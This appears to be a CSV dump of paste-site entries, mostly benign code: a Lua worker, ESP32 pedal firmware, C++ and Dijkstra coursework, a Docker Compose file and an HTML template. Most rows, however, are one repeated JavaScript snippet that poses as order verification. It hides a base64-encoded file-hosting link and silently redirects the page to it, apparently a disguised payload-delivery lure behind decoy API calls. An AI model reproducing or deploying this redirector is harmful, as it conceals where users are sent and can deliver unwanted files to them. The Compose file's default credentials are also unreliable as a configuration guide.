id,title,username,language,date,content
pfJ9xxuy,worker.lua,hhhzzzsss,Lua,Sunday 23rd of March 2025 03:33:33 PM CDT,"local component = require(""component"")
local event = require(""event"")
local computer = require(""computer"")
local os = require(""os"")
local term = require(""term"")
local modem = component.modem

local CONTROLLER_PORT = 1
local WORKER_PORT = 2

modem.open(1)

local function tickTime()
    return os.time() * (1000/60/60)
end

local function handle_ping(address)
    modem.send(address, WORKER_PORT)
end

local noteQueue = {}

local function handle_note(pitch, duration, time)
    table.insert(noteQueue, {pitch = pitch, duration = duration, time = time})
end

local function process_queue()
    if #noteQueue == 0 then return end
    
    local currentTime = tickTime()
    while #noteQueue > 0 and noteQueue[1].time <= currentTime do
        local note = table.remove(noteQueue, 1)
        computer.beep(note.pitch, note.duration)
    end
end

term.clear()
print(""Running worker..."")

while true do
    local id, _, remoteAddress, port, _, protocol, data1, data2, data3 = event.pullMultiple(""modem_message"", ""interrupted"")
    if id == ""interrupted"" then
        print(""Interrupted. Exiting..."")
        break
    end
    if port == CONTROLLER_PORT then
        if protocol == ""ping"" then
            handle_ping(remoteAddress)
        elseif protocol == ""note"" then
            handle_note(data1, data2, data3)
        end
    end
    
    process_queue()
end"
eyM8Yuiv,Untitled,MiaMyLove,JavaScript,Sunday 23rd of March 2025 03:33:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/161/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AN0ii1zh,GROK Esp32 HID XYZ axis Bluetooth/usb ssd1306 screen,LandoRo,C#,Sunday 23rd of March 2025 03:30:14 PM CDT,"#include <Wire.h>
#include <Adafruit_ADS1X15.h>
#include <Adafruit_SSD1306.h>
#include <BleGamepad.h>
#include <TinyUSB.h>
#include ""driver/usb_phy.h""

// OLED Config
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// ADS1115 Instance
Adafruit_ADS1115 ads;

// BLE Gamepad Instance
BleGamepad bleGamepad(""Generic Sim Pedals BLE"", ""xAI"", 100);

// TinyUSB HID Descriptor (3-axis joystick)
static const uint8_t hid_report_descriptor[] = {
    TUD_HID_REPORT_DESC_GAMEPAD(HID_REPORT_ID(1), 0, 0, 0, 32767, 32767, 32767)
};

// TinyUSB Device Descriptor
static const tusb_desc_device_t usb_device_descriptor = {
    .bLength = 18, .bDescriptorType = TUSB_DESC_DEVICE, .bcdUSB = 0x0200,
    .bMaxPacketSize0 = CFG_TUD_ENDPOINT0_SIZE, .idVendor = 0xCafe, .idProduct = 0x4001,
    .bcdDevice = 0x0100, .iManufacturer = 0x01, .iProduct = 0x02, .iSerialNumber = 0x03,
    .bNumConfigurations = 0x01
};

// USB Strings
static const char *usb_string_descriptor[] = {
    (char[]){0x09, 0x04}, ""xAI"", ""Generic Sim Pedals USB"", ""123456""
};

// TinyUSB Config
static const tinyusb_config_t tusb_cfg = {
    .device_descriptor = &usb_device_descriptor,
    .string_descriptor = usb_string_descriptor,
    .hid_report_descriptor = hid_report_descriptor,
    .hid_report_descriptor_len = sizeof(hid_report_descriptor)
};

// Pins
#define SDA_PIN 9
#define SCL_PIN 10
#define USB_DP_PIN 13
#define USB_DM_PIN 12

// Calibration (volts)
const float GAS_MIN_VOLT = 0.5f, GAS_MAX_VOLT = 4.5f;
const float BRAKE_MIN_VOLT = 0.5f, BRAKE_MAX_VOLT = 4.5f;
const float CLUTCH_MIN_VOLT = 0.5f, CLUTCH_MAX_VOLT = 4.5f;

// Axis Values
int16_t clutchValue, brakeValue, gasValue;

void setup() {
  Wire.begin(SDA_PIN, SCL_PIN);

  // ADS1115 Init
  if (!ads.begin(0x48)) while (1);
  ads.setGain(GAIN_TWOTHIRDS);

  // SSD1306 Init
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) while (1);
  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(""Sim Pedals"");
  display.display();

  // USB PHY Config
  usb_phy_config_t phy_conf = {
    .controller = USB_PHY_CTRL_OTG, .target = USB_PHY_TARGET_INT,
    .otg_mode = USB_OTG_MODE_DEVICE, .speed = USB_PHY_SPEED_FULL,
    .gpio_conf = { .dp_pin = USB_DP_PIN, .dm_pin = USB_DM_PIN }
  };
  usb_phy_handle_t phy_handle;
  if (usb_new_phy(&phy_conf, &phy_handle) != ESP_OK) while (1);

  // TinyUSB Init
  tinyusb_driver_install(&tusb_cfg);

  // BLE Init
  bleGamepad.begin();
  bleGamepad.setAutoReport(false);
}

void loop() {
  // Read ADC (inline to reduce function calls)
  float gasVoltage = ads.computeVolts(ads.readADC_SingleEnded(0));
  float brakeVoltage = ads.computeVolts(ads.readADC_SingleEnded(1));
  float clutchVoltage = ads.computeVolts(ads.readADC_SingleEnded(2));

  // Map to HID range (0-32767)
  gasValue = constrain(map(gasVoltage * 1000, GAS_MIN_VOLT * 1000, GAS_MAX_VOLT * 1000, 0, 32767), 0, 32767);
  brakeValue = constrain(map(brakeVoltage * 1000, BRAKE_MIN_VOLT * 1000, BRAKE_MAX_VOLT * 1000, 0, 32767), 0, 32767);
  clutchValue = constrain(map(clutchVoltage * 1000, CLUTCH_MIN_VOLT * 1000, CLUTCH_MAX_VOLT * 1000, 0, 32767), 0, 32767);

  // USB or BLE Reporting
  if (tud_ready()) {
    uint8_t report[6] = {
      (uint8_t)(gasValue & 0xFF), (uint8_t)(gasValue >> 8),
      (uint8_t)(brakeValue & 0xFF), (uint8_t)(brakeValue >> 8),
      (uint8_t)(clutchValue & 0xFF), (uint8_t)(clutchValue >> 8)
    };
    tud_hid_report(1, report, 6);
  } else if (bleGamepad.isConnected()) {
    bleGamepad.setAxes(gasValue, brakeValue, clutchValue, 0, 0, 0, 0, DPAD_CENTERED);
    bleGamepad.sendReport();
  }

  // Brake PSI
  float brakePSI = constrain(((brakeVoltage - 0.5f) / 4.0f) * 100.0f, 0.0f, 100.0f);

  // OLED Update
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  if (tud_ready()) display.print(""USB"");
  else if (bleGamepad.isConnected()) display.print(""BT"");
  display.setTextSize(2);
  display.setCursor(40, 16);  // Precomputed for ""Brake""
  display.print(""Brake"");
  display.setCursor(28, 40);  // Precomputed for ""XX.XX PSI""
  display.print(brakePSI, 2);
  display.print("" PSI"");
  display.display();

  delay(5);  // Reduced delay for responsiveness
}"
zckuAni3,Untitled,MiaMyLove,JavaScript,Sunday 23rd of March 2025 03:17:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/603/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
n4gHNACe,Untitled,MiaMyLove,JavaScript,Sunday 23rd of March 2025 03:02:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/498/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PQd3pSKi,Untitled,MiaMyLove,JavaScript,Sunday 23rd of March 2025 02:47:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/826/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4cb5EQNk,Другий семестр. Лабораторна робота №9-10 (Завдання 2),Lavig,C++,Sunday 23rd of March 2025 02:33:36 PM CDT,"#include <iostream>
#include <windows.h>
#include <vector>
#include <fstream>
#include <sstream>

using namespace std;

int main() {
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    ifstream input_file(""D:/files/input.txt"");
    if (!input_file) {
        cout << ""Файлу, з якого мають зчитуватися числа, не існує!"" << endl;
        return 0;
    }
    vector<vector<vector<int>>> all_matrices;
    vector<vector<int>> matrix;
    string line;
    while (getline(input_file, line)) {
        if (line.empty()) {
            if (!matrix.empty()) {
                all_matrices.push_back(matrix);
                matrix.clear();
            }
        }
        else {
            stringstream ss(line);
            vector<int> row;
            int num;
            while (ss >> num) {
                row.push_back(num);
            }
            matrix.push_back(row);
        }
    }
    if (!matrix.empty()) {
        all_matrices.push_back(matrix);
    }
    input_file.close();
    if (all_matrices.empty()) {
        cout << ""У файлі немає матриць!"" << endl;
        return 0;
    }
    ofstream output_file(""D:/files/input.txt"");
    ofstream odd_file(""D:/files/output.txt"");
    if (!output_file || !odd_file) {
        cout << ""Помилка відкриття вихідних файлів!"" << endl;
        return 0;
    }
    bool has_odd_sum_matrix = false;
    for (int m = 0; m < all_matrices.size(); m++) {
        matrix = all_matrices[m];
        int sum = 0;
        for (int i = 0; i < matrix.size(); i++) {
            for (int j = 0; j < matrix[i].size(); j++) {
                if (matrix[i][j] < 0 && matrix[i][j] % 2 != 0) {
                    sum += matrix[i][j];
                }
            }
        }
        if (sum % 2 != 0) {
            has_odd_sum_matrix = true;
            for (int i = 0; i < matrix.size(); i++) {
                for (int j = 0; j < matrix[i].size(); j++) {
                    odd_file << matrix[i][j] << "" "";
                }
                odd_file << ""\n"";
            }
            odd_file << ""\n"";
            for (int i = 0; i < matrix.size(); i++) {
                for (int j = 0; j < matrix[i].size(); j++) {
                    if (i == j) {
                        matrix[i][j] = 1;
                    }
                    else {
                        matrix[i][j] = 0;
                    }
                }
            }
        }
        for (int i = 0; i < matrix.size(); i++) {
            for (int j = 0; j < matrix[i].size(); j++) {
                output_file << matrix[i][j] << "" "";
            }
            output_file << ""\n"";
        }
        output_file << ""\n"";
    }
    output_file.close();
    odd_file.close();
    if (!has_odd_sum_matrix) {
        cout << ""Матриць із непарною сумою від'ємних чисел не знайдено."" << endl;
    }
    cout << ""Файли успішно оновлені!"" << endl;
}"
sGZ9TVdz,Untitled,MiaMyLove,JavaScript,Sunday 23rd of March 2025 02:31:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/064/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
a902jfdB,Untitled,nq1s788,C++,Sunday 23rd of March 2025 02:24:51 PM CDT,"В этой задаче нужно реализовать алгоритм Дейкстры за O(mlogn). Про алгоритм можно почитать здесь https://ru.algorithmica.org/cs/shortest-paths/dijkstra/

Я подписала в задаче, к сожалению в реализации используется сет на дереве, в ванильном питоне он не реализован, пример реализации на c++:
vector<int> dijkstra(int s) {
    vector<int> d(n, inf);
    d[root] = 0;
    set< pair<int, int> > q;
    q.insert({0, s});
    while (!q.empty()) {
        int v = q.begin()->second;
        q.erase(q.begin());
        for (auto [u, w] : g[v]) {
            if (d[u] > d[v] + w) {
                q.erase({d[u], u});
                d[u] = d[v] + w;
                q.insert({d[u], u});
            }
        }
    }
    return d;
}"
qi3AKebk,Untitled,nq1s788,Python,Sunday 23rd of March 2025 02:19:47 PM CDT,"В этой задаче нужно реализовать алгоритм Дейкстры за O(n^2). Про него подробнее можно почитать здесь: https://ru.algorithmica.org/cs/shortest-paths/dijkstra/

Пример кода на python:
n, m = map(int, input().split())
g = [[] for i in range(n)]
for i in range(m):
    x, y, c = map(int, input().split())
    x -= 1
    y -= 1
    g[x].append((y, c))
    g[y].append((x, c))
start, end = map(int, input().split())
start -= 1
end -= 1
inf = 1000000000
w = [inf for i in range(n)]
used = [False for i in range(n)]
w[start] = 0
for i in range(n):
    cur = -1
    cur_w = inf
    for e in range(n):
        if not used[e] and w[e] < cur_w:
            cur = e
            cur_w = w[e]
    if cur == -1:
        break
    used[cur] = True
    for to in g[cur]:
        w[to[0]] = min(w[to[0]], w[cur] + to[1])
if not used[end]:
    print(-1)
else:
    print(w[end])"
aaRenRRZ,Untitled,MiaMyLove,JavaScript,Sunday 23rd of March 2025 02:16:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/060/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZPbXTTRX,Untitled,MiaMyLove,JavaScript,Sunday 23rd of March 2025 02:00:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/940/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CTkAajS2,Untitled,MiaMyLove,JavaScript,Sunday 23rd of March 2025 01:45:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/766/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FZa8vKEP,Untitled,MiaMyLove,JavaScript,Sunday 23rd of March 2025 01:29:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/586/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qTW4NvbG,Untitled,MiaMyLove,JavaScript,Sunday 23rd of March 2025 01:14:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/303/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
u7yz6A6h,my_personal_docker_compose,Catsher,YAML,Sunday 23rd of March 2025 01:09:40 PM CDT,"version: '3.8'

services:
  postgresql:
    image: postgres:latest
    container_name: postgres_db 
    restart: always
    environment:
      - POSTGRES_USER=postgres
      - POSTGRES_PASSWORD=postgres
    ports:
      - 5432:5432
    volumes:
      - postgres_data:/var/lib/postgresql/data
    healthcheck:
      test: ""pg_isready""
      interval: 10s
      timeout: 5s
      retries: 5


  rabbitmq:
    image: rabbitmq:3.13-management
    restart: unless-stopped
    ports:
      - 5672:5672
      - 15672:15672
    healthcheck:
      test: ""rabbitmq-diagnostics -q ping""
      interval: 30s
      timeout: 30s
      retries: 3

  zookeeper:
    image: bitnami/zookeeper:latest
    restart: on-failure
    ports:
      - ""2181:2181""
    environment:
      ZOO_MY_ID: 1
      ZOO_PORT: 2181
      ZOO_SERVERS: server.1=zookeeper:2888:3888
      ALLOW_ANONYMOUS_LOGIN: ""yes""

  kafka:
    image: bitnami/kafka:latest
    restart: on-failure
    ports:
      - ""9092:9092""
    environment:
      KAFKA_ADVERTISED_LISTENERS: INTERNAL://kafka:29092,EXTERNAL://kafka:9092
      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT
      KAFKA_INTER_BROKER_LISTENER_NAME: INTERNAL
      KAFKA_ZOOKEEPER_CONNECT: ""zookeeper:2181""
      KAFKA_BROKER_ID: 1
      KAFKA_LOG4J_LOGGERS: ""kafka.controller=INFO,kafka.producer.async.DefaultEventHandler=INFO,state.change.logger=INFO""
      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1
      KAFKA_CFG_ZOOKEEPER_CONNECT: zookeeper:2181
      ALLOW_PLAINTEXT_LISTENER: ""yes""
      KAFKA_LISTENERS: ""INTERNAL://:29092,EXTERNAL://:9092""
      KAFKA_ZOOKEEPER_SESSION_TIMEOUT: ""6000""
      KAFKA_RESTART_ATTEMPTS: ""10""
      KAFKA_RESTART_DELAY: ""5""
      ZOOKEEPER_AUTOPURGE_PURGE_INTERVAL: ""0""
    depends_on:
      - zookeeper

  pgadmin:
    image: dpage/pgadmin4
    environment:
      PGADMIN_DEFAULT_EMAIL: admin@example.com
      PGADMIN_DEFAULT_PASSWORD: postgres
      PGADMIN_LISTEN_PORT: 80
    ports:
      - 5433:80
    volumes:
      - pgadmin:/var/lib/pgadmin
    depends_on:
      - postgresql
      - kafka
      
volumes:
    postgres_data:
      driver: local
    pgadmin: {}"
CB8YSyev,Bloom & Dine - โพสต์,Kelly-B9978,HTML,Sunday 23rd of March 2025 01:04:45 PM CDT,"<link href=""https://dl.dropbox.com/scl/fi/tpnytrlcop69bxh49xizy/BloomnDine.css?rlkey=nofl9g8t20qld95ihxdlwh73m&st=hcommcgi"" rel=""stylesheet"">
<div id=""BloomnDine""><a href=""https://discord.com/users/625292873914515456/""></a><div id=""bnd-thread"" class=""bnd-set"" style=""--bnd-bg: #f6eee3;--bnd-txt: #716d32;--bnd-primary: #545225;"">
<div class=""bnd-png1"" style=""--bnd-png: url(https://iili.io/3IR7uvj.png);transform: scaleX(-1) rotate(-45deg) translate(15%, 15%);""></div>
<div class=""bnd-png2"" style=""--bnd-png: url(https://iili.io/3IRBcB4.png);--bnd-pos: right top;--bnd-size: 80%;rotate: 20deg;""></div>
<div class=""bnd-paper"">
<div class=""bnd-name"">Bloom & Dine</div>
<div class=""bnd-gallery"">
<div class=""bnd-img"" style=""--bnd-pic: url(https://iili.io/3IANvt9.png);--bnd-pos: 50% 100%;--bnd-size: 105%;""></div>
<div class=""bnd-img"" style=""--bnd-pic: url(https://iili.io/3IAO0Ux.png);--bnd-pos: 50% 80%;""></div>
<div class=""bnd-img"" style=""--bnd-pic: url(https://iili.io/3IAOHSR.png);--bnd-pos: 50% 90%;--bnd-size: 110%;""></div>
<div class=""bnd-img"" style=""--bnd-pic: url(https://iili.io/3IAeCzP.png);--bnd-pos: 50% 68%;--bnd-size: 120%;""></div>
</div>
<div class=""bnd-content""> -- ข้อมูล อธิบายบรรยากาศในงาน --</div>
<div class=""bnd-topic"">เงื่อนไข</div>
[list]
[*]เงื่อนไข 1
[*]เงื่อนไข 2
[*]เงื่อนไข 3
[/list]
[align=center]( เขียนอะไรสักอย่าง )[/align]
</div></div></div>"
